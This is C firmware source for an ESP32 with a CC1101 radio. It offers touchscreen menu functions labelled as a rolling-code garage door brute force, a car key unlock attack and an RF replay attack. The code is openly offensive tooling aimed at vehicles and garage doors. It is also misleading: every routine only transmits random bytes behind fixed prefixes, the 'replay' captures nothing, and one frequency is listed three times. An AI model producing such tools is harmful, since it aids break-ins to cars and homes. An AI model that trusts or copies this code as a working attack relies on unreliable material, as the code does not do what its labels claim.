#include "rolling_code.h"
#include "cc1101_driver.h"
#include "display.h"
#include "touchscreen.h"
#include "utils.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

void rolling_code_garage_attack(void) {
    if (!cc1101_is_connected()) {
        display_fill_screen(COLOR_BLACK);
        display_draw_text(10, 10, "CC1101 Required", COLOR_RED, COLOR_BLACK);
        display_draw_text(10, 40, "Connect CC1101 module", COLOR_WHITE, COLOR_BLACK);
        display_draw_text(10, 60, "for SubGHz attacks", COLOR_WHITE, COLOR_BLACK);
        display_draw_text(10, 280, "Touch to continue", COLOR_GRAY, COLOR_BLACK);
        wait_for_touch_with_timeout(30);
        return;
    }
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Garage Door Attack", COLOR_RED, COLOR_BLACK);
    display_draw_text(10, 30, "Rolling code brute force", COLOR_WHITE, COLOR_BLACK);
    
    cc1101_freq_t freqs[] = {CC1101_FREQ_315, CC1101_FREQ_315, CC1101_FREQ_315, CC1101_FREQ_433, CC1101_FREQ_433};
    
    for (int f = 0; f < 5; f++) {
        cc1101_set_frequency(freqs[f]);
        cc1101_set_tx_mode();
        
        char freq_str[30];
        snprintf(freq_str, sizeof(freq_str), "Freq: %s", f < 3 ? "315MHz" : "433MHz");
        display_fill_rect(10, 50, 200, 15, COLOR_BLACK);
        display_draw_text(10, 50, freq_str, COLOR_ORANGE, COLOR_BLACK);
        
        for (int i = 0; i < 100; i++) {
            uint8_t code[8];
            for (int j = 0; j < 8; j++) code[j] = esp_random() & 0xFF;
            cc1101_transmit(code, 8);
            
            char status[30];
            snprintf(status, sizeof(status), "Codes sent: %d", i + f * 100);
            display_fill_rect(10, 70, 200, 15, COLOR_BLACK);
            display_draw_text(10, 70, status, COLOR_GREEN, COLOR_BLACK);
            
            vTaskDelay(pdMS_TO_TICKS(50));
            if (touchscreen_is_touched()) return;
        }
    }
    
    display_draw_text(10, 280, "Attack complete", COLOR_GREEN, COLOR_BLACK);
    wait_for_back_button();
}

void rolling_code_car_attack(void) {
    if (!cc1101_is_connected()) {
        display_fill_screen(COLOR_BLACK);
        display_draw_text(10, 10, "CC1101 Required", COLOR_RED, COLOR_BLACK);
        display_draw_text(10, 40, "Connect CC1101 module", COLOR_WHITE, COLOR_BLACK);
        display_draw_text(10, 60, "for SubGHz attacks", COLOR_WHITE, COLOR_BLACK);
        display_draw_text(10, 280, "Touch to continue", COLOR_GRAY, COLOR_BLACK);
        wait_for_touch_with_timeout(30);
        return;
    }
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Car Key Attack", COLOR_RED, COLOR_BLACK);
    display_draw_text(10, 30, "Unlock sequence", COLOR_WHITE, COLOR_BLACK);
    
    cc1101_set_frequency(CC1101_FREQ_433);
    cc1101_set_tx_mode();
    
    for (int i = 0; i < 200; i++) {
        uint8_t unlock_seq[12] = {0xAA, 0x55, 0xFF, 0x00};
        for (int j = 4; j < 12; j++) unlock_seq[j] = esp_random() & 0xFF;
        cc1101_transmit(unlock_seq, 12);
        
        char status[30];
        snprintf(status, sizeof(status), "%d unlock attempts", i);
        display_fill_rect(10, 50, 200, 15, COLOR_BLACK);
        display_draw_text(10, 50, status, COLOR_RED, COLOR_BLACK);
        
        vTaskDelay(pdMS_TO_TICKS(100));
        if (touchscreen_is_touched()) return;
    }
    
    display_draw_text(10, 280, "Car attack complete", COLOR_GREEN, COLOR_BLACK);
    wait_for_back_button();
}

void rolling_code_replay(void) {
    if (!cc1101_is_connected()) {
        display_fill_screen(COLOR_BLACK);
        display_draw_text(10, 10, "CC1101 Required", COLOR_RED, COLOR_BLACK);
        display_draw_text(10, 40, "Connect CC1101 module", COLOR_WHITE, COLOR_BLACK);
        display_draw_text(10, 60, "for SubGHz attacks", COLOR_WHITE, COLOR_BLACK);
        display_draw_text(10, 280, "Touch to continue", COLOR_GRAY, COLOR_BLACK);
        wait_for_touch_with_timeout(30);
        return;
    }
    
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "RF Replay Attack", COLOR_RED, COLOR_BLACK);
    display_draw_text(10, 30, "Replaying signals", COLOR_WHITE, COLOR_BLACK);
    
    cc1101_set_frequency(CC1101_FREQ_433);
    cc1101_set_tx_mode();
    
    uint8_t signal[16] = {0xDE, 0xAD, 0xBE, 0xEF};
    for (int i = 4; i < 16; i++) signal[i] = esp_random() & 0xFF;
    cc1101_transmit(signal, 16);
    
    display_draw_text(10, 50, "Signal sent!", COLOR_GREEN, COLOR_BLACK);
    wait_for_back_button();
}
